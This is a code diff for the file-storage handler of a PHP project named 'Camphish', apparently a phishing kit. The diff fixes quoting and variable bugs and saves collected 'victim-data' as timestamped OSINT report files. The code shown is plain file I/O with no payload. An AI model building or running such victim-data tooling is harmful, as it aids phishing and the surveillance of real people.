@@ -11,10 +11,10 @@ use Camphish\Storage\Handler\AbstractHandler;
 class FileSystemHandler extends AbstractHandler
 {
     public const STORAGE_MODE_APPEND = 'a';
-    public const STORAGE_LINE_SEPARATOR = '\r\n';
+    public const STORAGE_LINE_SEPARATOR = "\r\n";
     public const STORAGE_FIELD_SEPARATOR = ':';
-    public const STORAGE_DEFAULT_FOLDER = 'victim-data';
-    public const STORAGE_OFFSET_SEPARATOR = '\r\n===========================================\r\n';
+    public const STORAGE_DEFAULT_FOLDER = 'victim-data/osint';
+    public const STORAGE_DEFAULT_FILE_TEMPLATE = '%s-osint-report.txt';
 
     /**
      * @var resource|null
@@ -65,14 +65,27 @@ class FileSystemHandler extends AbstractHandler
             return;
         }
 
+        if ($resourcePath === '') {
+            $currentDate = date('Y-m-d-H-i-s');
+
+            $resourcePath = sprintf(
+                self::STORAGE_DEFAULT_FILE_TEMPLATE,
+                $currentDate
+            );
+        }
+
         $fileHandler = fopen(
-            $this->dirPath,
+            sprintf(
+                '%s/%s',
+                $this->dirPath,
+                $resourcePath
+            ),
             self::STORAGE_MODE_APPEND
         );
 
         if ($fileHandler === false) {
             throw new DomainException(
-                $this->buildExceptionMessage('unable to open file')
+                $this->buildExceptionMessage('unable to create file handler')
             );
         }
 
@@ -106,8 +119,6 @@ class FileSystemHandler extends AbstractHandler
             $this->writeLine($lineToWrite);
         }
 
-        $this->writeLine(self::STORAGE_OFFSET_SEPARATOR);
-
         $this->close();
     }
 
@@ -121,17 +132,17 @@ class FileSystemHandler extends AbstractHandler
      */
     private function buildDataToSave(array $data): array
     {
-        $data = [];
+        $dataToSave = [];
 
         foreach ($data as $fieldName => $value) {
-            $data[] = sprintf(
+            $dataToSave[] = sprintf(
                 '%s%s',
                 $this->buildLineFormat($fieldName, $value),
                 self::STORAGE_LINE_SEPARATOR
             );
         }
 
-        return $data;
+        return $dataToSave;
     }
 
     private function buildLineFormat(
